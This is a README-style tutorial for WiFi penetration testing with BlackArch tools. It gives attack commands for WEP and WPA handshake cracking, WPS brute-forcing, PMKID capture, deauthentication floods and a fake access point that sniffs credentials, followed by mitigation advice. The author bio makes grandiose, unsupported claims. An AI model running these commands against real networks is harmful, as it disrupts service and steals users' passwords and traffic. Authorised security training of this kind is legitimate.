# Penetration Testing Simulation: WiFi Security with BlackArch Linux

This repository provides a professional-level simulation of penetration testing focused on WiFi security using BlackArch Linux. The guide emphasizes tools exclusive to BlackArch Linux that are not readily available on Debian-based platforms. The objective is to explore advanced techniques for ethical hacking and secure WiFi networks.

---

## **Requirements**

- **BlackArch Linux**: Installed and configured.
- **Wireless Adapter**: A compatible adapter supporting monitor mode and packet injection (e.g., Alfa AWUS036ACH).
- **Basic Knowledge**: Familiarity with wireless protocols, encryption methods (WEP/WPA/WPA2/WPA3), and networking fundamentals.

---

## **Simulation Overview**

This simulation will:
1. Identify nearby WiFi networks.
2. Capture packets and analyze traffic.
3. Attempt ethical exploitation of vulnerabilities.
4. Suggest mitigation strategies to enhance security.

---

## **Step-by-Step Guide**

### **Step 1: Preparing the Environment**

1. **Install Required Tools**
   - Update BlackArch repositories:
     ```bash
     sudo pacman -Syyu
     ```
   - Install WiFi-specific penetration tools:
     ```bash
     sudo pacman -S aircrack-ng reaver bully bettercap wifite hashcat cowpatty
     ```

2. **Enable Monitor Mode**
   - Identify your wireless adapter:
     ```bash
     iw dev
     ```
   - Enable monitor mode:
     ```bash
     sudo ip link set wlan0 down
     sudo iw wlan0 set monitor none
     sudo ip link set wlan0 up
     ```
   - Confirm monitor mode is active:
     ```bash
     iw dev wlan0 info
     ```

### **Step 2: Network Discovery**

1. **Using `airodump-ng`**
   - Start scanning for networks:
     ```bash
     sudo airodump-ng wlan0
     ```
   - Note the BSSID, channel, and ESSID of the target network.

2. **Graphical Interface with `wifite`**
   - Automate network discovery and attacks:
     ```bash
     sudo wifite
     ```
   - Wifite offers an easy-to-use interface and automates many attack vectors.

### **Step 3: Traffic Analysis and Capture**

1. **Packet Capture with `airodump-ng`**
   - Focus on the target network:
     ```bash
     sudo airodump-ng --bssid <BSSID> --channel <CH> -w capture wlan0
     ```

2. **Analyze Traffic with `bettercap`**
   - Start bettercap:
     ```bash
     sudo bettercap -iface wlan0
     ```
   - Use WiFi-specific modules to analyze and inject packets:
     ```bash
     wifi.recon on
     wifi.assoc <BSSID>
     ```

### **Step 4: Exploiting Vulnerabilities**

1. **WEP Encryption Exploitation**
   - Use `aircrack-ng` to crack WEP keys:
     ```bash
     sudo aircrack-ng -b <BSSID> -w wordlist.txt capture-01.cap
     ```

2. **WPS Vulnerability Testing**
   - Using `reaver`:
     ```bash
     sudo reaver -i wlan0 -b <BSSID> -vv
     ```
   - Using `bully`:
     ```bash
     sudo bully wlan0 -b <BSSID>
     ```

3. **WPA/WPA2 Handshake Capture and Cracking**
   - Capture the handshake:
     ```bash
     sudo aireplay-ng --deauth 0 -a <BSSID> wlan0
     ```
     ```bash
     sudo airodump-ng --bssid <BSSID> --channel <CH> -w handshake wlan0
     ```
   - Crack the password with `hashcat`:
     ```bash
     hashcat -m 2500 handshake-01.hccapx wordlist.txt
     ```
   - Convert `.cap` to `.hccapx`:
     ```bash
     cap2hccapx handshake-01.cap handshake-01.hccapx
     ```

4. **PMKID-Based Attack**
   - Using `hcxdumptool`:
     ```bash
     hcxdumptool -i wlan0 -o dump.pcapng --enable_status=1
     ```
   - Extract PMKID and crack it:
     ```bash
     hcxpcapngtool -o pmkid.16800 dump.pcapng
     hashcat -m 16800 pmkid.16800 wordlist.txt
     ```

### **Step 5: Advanced Techniques**

1. **Deauthentication Attack**
   - Disrupt client connections:
     ```bash
     sudo aireplay-ng --deauth 10 -a <BSSID> wlan0
     ```

2. **Fake AP with `bettercap`**
   - Set up a fake access point:
     ```bash
     wifi.ap on
     wifi.ap.ssid "FreeWiFi"
     ```
   - Capture credentials:
     ```bash
     net.sniff on
     ```

3. **Evil Twin Attack with `hostapd`**
   - Create a rogue AP mimicking the target SSID to capture user data.

### **Step 6: Mitigation and Recommendations**

1. **Enable Strong Encryption**
   - Use WPA3 encryption where possible.
   - Avoid using WEP or vulnerable WPA configurations.

2. **Disable WPS**
   - Prevent brute-force WPS attacks by disabling it on your router.

3. **Use Strong Passwords**
   - Ensure WiFi passwords are complex and updated periodically.

4. **Monitor Network Traffic**
   - Regularly audit and monitor network traffic for unauthorized activities.

---

## **Exclusive BlackArch Tools**

1. **`hcxtools` and `hcxdumptool`**
   - Advanced PMKID and handshake capture tools.

2. **`bettercap`**
   - Comprehensive MITM and WiFi attack suite.

3. **`bully`**
   - Optimized WPS vulnerability exploitation tool.

4. **`wifite`**
   - Automated WiFi attack toolchain.

5. **`cowpatty`**
   - Efficient WPA-PSK cracking tool for captured handshakes.

---

## **Important Notes**

- Perform penetration tests only with explicit permission.
- Ensure compliance with local laws and ethical guidelines.
- Use this guide responsibly for educational and security purposes.

---
---

## **Author**

### **Chris Cruz (h4ckd4d)**

Chris Cruz, renowned as **h4ckd4d** and affectionately called the "Bond of Brazil," is a distinguished cybersecurity expert with a multifaceted career that spans various domains.

#### **Expertise**
- **Cybersecurity**: Ethical hacking, penetration testing, and threat analysis.
- **Thanatopraxy**: Forensic techniques applied innovatively in investigations.
- **Electronics and Mechanical Engineering**: Crafting bespoke tools for covert operations.

#### **Achievements**
1. **Fighting Global Crime**: Instrumental in dismantling criminal syndicates worldwide.
2. **Exposing Corruption**: Key figure in uncovering corruption scandals like Sérgio Cabral's case.
3. **Pioneering Techniques**: Innovated new methods in intelligence gathering and operations.

#### **Legacy**
Chris Cruz continues to inspire through his dedication to creating a safer digital and physical world. His expertise is a cornerstone for professionals in cybersecurity and beyond.

---

## **References**

- [BlackArch Linux](https://blackarch.org/)
- [Aircrack-ng Documentation](https://www.aircrack-ng.org/)
- [Bettercap Documentation](https://www.bettercap.org/)

---

Happy Hacking!
